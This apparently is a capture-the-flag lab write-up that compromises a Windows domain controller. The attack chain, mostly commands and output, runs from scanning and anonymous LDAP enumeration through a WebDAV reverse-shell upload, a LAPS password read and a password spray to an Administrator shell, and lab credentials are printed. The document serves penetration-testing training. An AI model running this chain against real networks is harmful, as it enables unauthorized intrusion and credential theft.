Level: Intermediate 

```
sudo nmap 192.168.244.122 -p- -vv -n -Pn -T4
...
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 125
80/tcp    open  http             syn-ack ttl 125
88/tcp    open  kerberos-sec     syn-ack ttl 125
135/tcp   open  msrpc            syn-ack ttl 125
139/tcp   open  netbios-ssn      syn-ack ttl 125
389/tcp   open  ldap             syn-ack ttl 125
445/tcp   open  microsoft-ds     syn-ack ttl 125
464/tcp   open  kpasswd5         syn-ack ttl 125
593/tcp   open  http-rpc-epmap   syn-ack ttl 125
636/tcp   open  ldapssl          syn-ack ttl 125
3268/tcp  open  globalcatLDAP    syn-ack ttl 125
3269/tcp  open  globalcatLDAPssl syn-ack ttl 125
5985/tcp  open  wsman            syn-ack ttl 125
9389/tcp  open  adws             syn-ack ttl 125
49666/tcp open  unknown          syn-ack ttl 125
49668/tcp open  unknown          syn-ack ttl 125
49673/tcp open  unknown          syn-ack ttl 125
49674/tcp open  unknown          syn-ack ttl 125
49676/tcp open  unknown          syn-ack ttl 125
49692/tcp open  unknown          syn-ack ttl 125
```


```
nmap 192.168.244.122 -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49666,49668,49673,49674,49676,49692 -vv -n -Pn -sC -sV
.
.
.
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 125 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 125 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
|_  Potentially risky methods: TRACE COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
|   Server Date: Mon, 15 Dec 2025 09:44:31 GMT
|   Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
|_  Server Type: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  syn-ack ttl 125 Microsoft Windows Kerberos (server time: 2025-12-15 09:43:42Z)
135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 125
464/tcp   open  kpasswd5?     syn-ack ttl 125
593/tcp   open  ncacn_http    syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 125
3268/tcp  open  ldap          syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 125
5985/tcp  open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 125 .NET Message Framing
49666/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49673/tcp open  ncacn_http    syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49676/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49692/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
Service Info: Host: HUTCHDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 26781/tcp): CLEAN (Timeout)
|   Check 2 (port 43772/tcp): CLEAN (Timeout)
|   Check 3 (port 61801/udp): CLEAN (Timeout)
|   Check 4 (port 29255/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-12-15T09:44:34
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 0s

```

information we managed to recover: 
domain name: hutch.offsec
```
ldapsearch -H ldap://192.168.244.122 -x -s base namingcontexts
```


Domain Name: HUTCH
Domain Sid: S-1-5-21-2216925765-458455009-2806096489


```
ldapsearch -x -H ldap://192.168.244.122 -D '' -w '' -b "DC=hutch,DC=offsec"
```
usernames harvested: 
```
rplacidi
opatry
ltaunton
acostello
jsparwell
oknee
jmckendry
avictoria
jfrarey
eaburrow
cluddy
agitthouse
fmcsorley
domainadmin
Administrator
Guest
krbtgt
```

description of the accounts
```
ldapsearch -x -H ldap://192.168.217.122 -D '' -w '' -b "DC=hutch,DC=offsec" | grep description
```

![](../../Assets/Screenshot%202025-12-15%20at%208.29.32%20PM.png)

retrieved password: CrabSharkJellyfish192
account: fmcsorley

http-webdav
```
curl -T '/home/hnin/Desktop/shell.aspx' 'http://192.168.217.122/' -u fmcsorley:CrabSharkJellyfish192
```
shell.aspx -> reverse shell back to ourselves

managed to get a shell back to read local.txt


```
crackmapexec smb 192.168.217.122 -u "fmcsorley" -p "CrabSharkJellyfish192" --shares
SMB         192.168.217.122 445    HUTCHDC          [*] Windows 10 / Server 2019 Build 17763 x64 (name:HUTCHDC) (domain:hutch.offsec) (signing:True) (SMBv1:False)
SMB         192.168.217.122 445    HUTCHDC          [+] hutch.offsec\fmcsorley:CrabSharkJellyfish192 
SMB         192.168.217.122 445    HUTCHDC          [+] Enumerated shares
SMB         192.168.217.122 445    HUTCHDC          Share           Permissions     Remark
SMB         192.168.217.122 445    HUTCHDC          -----           -----------     ------
SMB         192.168.217.122 445    HUTCHDC          ADMIN$                          Remote Admin
SMB         192.168.217.122 445    HUTCHDC          C$                              Default share
SMB         192.168.217.122 445    HUTCHDC          IPC$            READ            Remote IPC
SMB         192.168.217.122 445    HUTCHDC          NETLOGON        READ            Logon server share 
SMB         192.168.217.122 445    HUTCHDC          SYSVOL          READ            Logon server share 
```

```
rpcclient -U fmcsorley 192.168.217.122
```

```
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[rplacidi] rid:[0x44f]
user:[opatry] rid:[0x450]
user:[ltaunton] rid:[0x451]
user:[acostello] rid:[0x452]
user:[jsparwell] rid:[0x453]
user:[oknee] rid:[0x454]
user:[jmckendry] rid:[0x455]
user:[avictoria] rid:[0x456]
user:[jfrarey] rid:[0x457]
user:[eaburrow] rid:[0x458]
user:[cluddy] rid:[0x459]
user:[agitthouse] rid:[0x45a]
user:[fmcsorley] rid:[0x45b]
user:[domainadmin] rid:[0x45c]
```

traversing thru smb -> nothing informational

bloodhound
```
bloodhound-python -u 'fmcsorley' -p 'CrabSharkJellyfish192' -ns 192.168.217.122 -d hutch.offsec -c all
```


opening in bloodhound
![](../../Assets/Screenshot%202025-12-15%20at%209.40.36%20PM.png)



```
bloodyAD --host 192.168.217.122 -d hutch.offsec -u 'fmcsorley' -p 'CrabSharkJellyfish192' get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime

distinguishedName: CN=HUTCHDC,OU=Domain Controllers,DC=hutch,DC=offsec
ms-Mcs-AdmPwd: 4y68iK&2A]+!}Y
ms-Mcs-AdmPwdExpirationTime: 134128670611105063
```


matches the password for Administrator
```
crackmapexec smb 192.168.217.122 -u user2.list -p "4y68iK&2A]+!}Y"                                     
SMB         192.168.217.122 445    HUTCHDC          [*] Windows 10 / Server 2019 Build 17763 x64 (name:HUTCHDC) (domain:hutch.offsec) (signing:True) (SMBv1:False)
SMB         192.168.217.122 445    HUTCHDC          [-] hutch.offsec\rplacidi:4y68iK&2A]+!}Y STATUS_LOGON_FAILURE 
SMB         192.168.217.122 445    HUTCHDC          [-] hutch.offsec\opatry:4y68iK&2A]+!}Y STATUS_LOGON_FAILURE 
SMB         192.168.217.122 445    HUTCHDC          [-] hutch.offsec\ltaunton:4y68iK&2A]+!}Y STATUS_LOGON_FAILURE 
SMB         192.168.217.122 445    HUTCHDC          [-] hutch.offsec\acostello:4y68iK&2A]+!}Y STATUS_LOGON_FAILURE 
SMB         192.168.217.122 445    HUTCHDC          [-] hutch.offsec\jsparwell:4y68iK&2A]+!}Y STATUS_LOGON_FAILURE 
SMB         192.168.217.122 445    HUTCHDC          [-] hutch.offsec\oknee:4y68iK&2A]+!}Y STATUS_LOGON_FAILURE 
SMB         192.168.217.122 445    HUTCHDC          [-] hutch.offsec\jmckendry:4y68iK&2A]+!}Y STATUS_LOGON_FAILURE 
SMB         192.168.217.122 445    HUTCHDC          [-] hutch.offsec\avictoria:4y68iK&2A]+!}Y STATUS_LOGON_FAILURE 
SMB         192.168.217.122 445    HUTCHDC          [-] hutch.offsec\jfrarey:4y68iK&2A]+!}Y STATUS_LOGON_FAILURE 
SMB         192.168.217.122 445    HUTCHDC          [-] hutch.offsec\eaburrow:4y68iK&2A]+!}Y STATUS_LOGON_FAILURE 
SMB         192.168.217.122 445    HUTCHDC          [-] hutch.offsec\cluddy:4y68iK&2A]+!}Y STATUS_LOGON_FAILURE 
SMB         192.168.217.122 445    HUTCHDC          [-] hutch.offsec\agitthouse:4y68iK&2A]+!}Y STATUS_LOGON_FAILURE 
SMB         192.168.217.122 445    HUTCHDC          [-] hutch.offsec\fmcsorley:4y68iK&2A]+!}Y STATUS_LOGON_FAILURE 
SMB         192.168.217.122 445    HUTCHDC          [-] hutch.offsec\domainadmin:4y68iK&2A]+!}Y STATUS_LOGON_FAILURE 
SMB         192.168.217.122 445    HUTCHDC          [+] hutch.offsec\Administrator:4y68iK&2A]+!}Y (Pwn3d!)
```

managed to get the Administrator shell: 
```
evil-winrm -i 192.168.217.122 -u Administrator -p "4y68iK&2A]+!}Y"
```




